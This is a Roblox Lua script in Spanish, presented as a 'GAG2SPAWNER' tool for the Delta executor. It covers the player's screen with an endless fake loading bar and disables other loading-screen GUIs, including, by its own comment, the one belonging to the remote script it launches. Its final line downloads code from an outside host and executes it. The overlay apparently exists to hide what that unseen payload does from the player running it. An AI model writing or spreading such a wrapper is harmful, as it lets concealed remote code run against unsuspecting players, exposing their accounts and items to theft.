-- GAG2SPAWNER: Script de Pantalla de Carga Infinita para Roblox
-- Optimizado para Delta Executor

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Crear ScreenGui de GAG2SPAWNER
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GAG2SPAWNERGui"
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999 -- Asegurar que esté por encima de casi todo
screenGui.Parent = playerGui

-- Crear Frame de fondo
local backgroundFrame = Instance.new("Frame")
backgroundFrame.Name = "BackgroundFrame"
backgroundFrame.Size = UDim2.new(1, 0, 1, 0)
backgroundFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
backgroundFrame.Parent = screenGui

-- Crear TextLabel para el mensaje
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = UDim2.new(0.8, 0, 0.1, 0)
loadingText.Position = UDim2.new(0.1, 0, 0.4, 0)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.Font = Enum.Font.SourceSansBold
loadingText.TextSize = 30
loadingText.Text = "El script se está cargando..."
loadingText.TextScaled = true
loadingText.TextWrapped = true
loadingText.Parent = backgroundFrame

-- Crear Frame para la barra de carga (contenedor)
local loadingBarContainer = Instance.new("Frame")
loadingBarContainer.Name = "LoadingBarContainer"
loadingBarContainer.Size = UDim2.new(0.6, 0, 0.05, 0)
loadingBarContainer.Position = UDim2.new(0.2, 0, 0.55, 0)
loadingBarContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
loadingBarContainer.BorderSizePixel = 0
loadingBarContainer.Parent = backgroundFrame

-- Crear Frame para la barra de carga (progreso)
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = UDim2.new(0, 0, 1, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
loadingBar.BorderSizePixel = 0
loadingBar.Parent = loadingBarContainer

-- Animación de la barra de carga infinita
local tweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, -1, true, 0)
local goal = {Size = UDim2.new(1, 0, 1, 0)}
local tween = tweenService:Create(loadingBar, tweenInfo, goal)
tween:Play()

-- LÓGICA PARA OCULTAR OTRAS PANTALLAS DE CARGA
-- Esta función detectará cuando se añadan nuevas GUIs y las ocultará si parecen ser pantallas de carga
playerGui.ChildAdded:Connect(function(child)
    if child:IsA("ScreenGui") and child.Name ~= "GAG2SPAWNERGui" then
        -- Esperamos un momento para ver si es una pantalla de carga (generalmente tienen frames que ocupan toda la pantalla)
        task.wait(0.1)
        local isLoadingScreen = false
        for _, descendant in pairs(child:GetDescendants()) do
            if descendant:IsA("Frame") and (descendant.Size.X.Scale >= 0.9 and descendant.Size.Y.Scale >= 0.9) then
                isLoadingScreen = true
                break
            end
            -- También buscamos palabras clave como "Loading" o "Cargando"
            if descendant:IsA("TextLabel") and (string.find(string.lower(descendant.Text), "load") or string.find(string.lower(descendant.Text), "cargando")) then
                isLoadingScreen = true
                break
            end
        end
        
        if isLoadingScreen then
            child.Enabled = false -- Desactivamos la GUI externa
            print("GAG2SPAWNER: Pantalla de carga externa detectada y ocultada.")
        end
    end
end)

-- Ejecutar el script externo
-- Al estar nuestra GUI en un DisplayOrder muy alto y tener el ChildAdded activo, 
-- la pantalla de carga de Heinz debería quedar oculta.
loadstring(game:HttpGet("https://hesiz.com/api/iepONhug/raw"))()
